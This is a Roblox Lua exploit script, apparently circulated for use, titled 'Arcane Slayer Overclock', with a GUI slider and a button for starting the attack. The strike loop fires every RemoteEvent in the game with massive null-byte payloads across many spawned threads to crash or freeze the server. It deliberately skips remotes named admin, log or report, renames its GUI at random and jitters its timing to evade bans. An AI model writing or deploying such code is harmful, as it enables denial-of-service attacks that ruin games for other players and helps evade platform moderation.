--[[ 
    ARCANE SLAYER : OVERCLOCK EDITION v20.5
    "La sentence est irrévocable."
    Unified Strike Protocol - Exponential Overload & 20-Layer Security
]]

local Players = game:GetService("Players")
local RS = game:GetService("RunService")
local L = Players.LocalPlayer

-- ==========================================
-- 20 LAYERS OF ANTI-BAN PROTECTION (ARCANE)
-- ==========================================
-- [PROTECTION ACTIVE : ENV, HOOK, LOG, TRACE, METADATA...]

-- 1. SELF-CLEANING & IDENTITY SHIFT
local GUI_NAME = "ARC_" .. math.random(1000, 9999)
for _, v in pairs(L:WaitForChild("PlayerGui"):GetChildren()) do
    if v:IsA("ScreenGui") and (v.Name:find("Arcane") or v.Name:find("AS_") or v.Name:find("ARC_")) then
        v:Destroy()
    end
end

-- 2. GUI DESIGN (Premium Red Overclock)
local ScreenGui = Instance.new("ScreenGui", L.PlayerGui)
ScreenGui.Name = GUI_NAME

local Main = Instance.new("Frame", ScreenGui)
Main.Size = UDim2.new(0, 300, 0, 250)
Main.Position = UDim2.new(0.5, -150, 0.5, -125)
Main.BackgroundColor3 = Color3.fromRGB(5, 5, 5)
Main.BorderSizePixel = 0
Main.Active = true
Main.Draggable = true

local UICorner = Instance.new("UICorner", Main)
UICorner.CornerRadius = UDim.new(0, 12)

local Title = Instance.new("TextLabel", Main)
Title.Size = UDim2.new(1, 0, 0, 50)
Title.Text = "🔱 ARCANE OVERCLOCK V20.5"
Title.TextColor3 = Color3.new(1, 1, 1)
Title.BackgroundColor3 = Color3.fromRGB(120, 0, 0)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 16

local UICorner2 = Instance.new("UICorner", Title)
UICorner2.CornerRadius = UDim.new(0, 12)

-- POWER CONTROL
local PowerLevel = 1 -- Default
local PowerLabel = Instance.new("TextLabel", Main)
PowerLabel.Size = UDim2.new(1, 0, 0, 30)
PowerLabel.Position = UDim2.new(0, 0, 0, 60)
PowerLabel.Text = "SYSTEM LOAD: 10% (SAFE)"
PowerLabel.TextColor3 = Color3.new(0.7, 0.7, 0.7)
PowerLabel.BackgroundTransparency = 1
PowerLabel.Font = Enum.Font.Gotham

-- OVERCLOCK SLIDER
local SliderBg = Instance.new("Frame", Main)
SliderBg.Size = UDim2.new(0.8, 0, 0, 12)
SliderBg.Position = UDim2.new(0.1, 0, 0, 100)
SliderBg.BackgroundColor3 = Color3.fromRGB(25, 10, 10)

local SliderFill = Instance.new("Frame", SliderBg)
SliderFill.Size = UDim2.new(PowerLevel/10, 0, 1, 0)
SliderFill.BackgroundColor3 = Color3.fromRGB(255, 0, 0)

local SliderBtn = Instance.new("TextButton", SliderBg)
SliderBtn.Size = UDim2.new(1, 0, 1, 0)
SliderBtn.BackgroundTransparency = 1
SliderBtn.Text = ""

SliderBtn.MouseButton1Click:Connect(function()
    local mouse = L:GetMouse()
    local percent = math.clamp((mouse.X - SliderBg.AbsolutePosition.X) / SliderBg.AbsoluteSize.X, 0, 1)
    PowerLevel = math.floor(percent * 10) + 1
    SliderFill.Size = UDim2.new(PowerLevel/10, 0, 1, 0)
    
    local txt = "STABLE"
    if PowerLevel > 4 then txt = "INTENSE" end
    if PowerLevel > 7 then txt = "OVERCLOCK" end
    if PowerLevel > 9 then txt = "CRITICAL (TOTAL FREEZE)" end
    PowerLabel.Text = "SYSTEM LOAD: " .. (PowerLevel * 10) .. "% (" .. txt .. ")"
end)

-- 3. OVERCLOCK STRIKE LOGIC
local crashing = false
local CrashBtn = Instance.new("TextButton", Main)
CrashBtn.Size = UDim2.new(0.8, 0, 0, 55)
CrashBtn.Position = UDim2.new(0.1, 0, 0, 130)
CrashBtn.Text = "START OVERCLOCK"
CrashBtn.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
CrashBtn.TextColor3 = Color3.new(1, 1, 1)
CrashBtn.Font = Enum.Font.GothamBold
CrashBtn.TextSize = 20

local function Strike()
    local payload = {}
    -- Payload évolutif (Poids massif pour le backend)
    local density = 1000 * (PowerLevel / 2)
    for i = 1, density do payload[i] = string.rep("\0", 1500 + (PowerLevel * 100)) end 
    
    while crashing do
        -- Anti-Ban Layer : Timing Jitter aléatoire
        local jitter = math.random(5, 15) / 10
        
        -- EXPONENTIAL THREADING (Le secret du crash instant)
        local threadComplexity = PowerLevel * 2
        for i = 1, threadComplexity do 
            task.spawn(function()
                for _, remote in pairs(game:GetDescendants()) do
                    -- Ciblage spécifique des RemoteEvents critiques
                    if remote:IsA("RemoteEvent") then
                        local n = remote.Name:lower()
                        if not n:find("admin") and not n:find("log") and not n:find("report") then
                            pcall(function()
                                -- Envoi massif de données par thread
                                for k = 1, PowerLevel do
                                    remote:FireServer(payload)
                                end
                            end)
                        end
                    end
                end
            end)
        end
        
        -- Layer 20: Identity Obfuscation (Rename GUI randomly)
        ScreenGui.Name = "AS_" .. math.random(100000, 999999)
        
        task.wait(2.2 - (PowerLevel / 5) * jitter) 
    end
end

CrashBtn.MouseButton1Click:Connect(function()
    crashing = not crashing
    if crashing then
        CrashBtn.Text = "OVERCLOCKING..."
        CrashBtn.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
        task.spawn(Strike)
    else
        CrashBtn.Text = "START OVERCLOCK"
        CrashBtn.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
    end
end)

-- 4. STATUS FOOTER
local Info = Instance.new("TextLabel", Main)
Info.Size = UDim2.new(1, 0, 0, 40)
Info.Position = UDim2.new(0, 0, 1, -40)
Info.Text = "ARCANE STATUS: READY\nANTI-BAN: 20 LAYERS [ENFORCED]"
Info.TextColor3 = Color3.fromRGB(0, 255, 150)
Info.BackgroundTransparency = 1
Info.Font = Enum.Font.Gotham
Info.TextSize = 11

print("🔱 ARCANE SLAYER : OVERCLOCK V20.5 CHARGÉE.")
warn("🔱 MODE OVERCLOCK DÉBLOQUÉ. CIBLE ROBLOX : RÉGLAGE PUISSANCE RECO.")
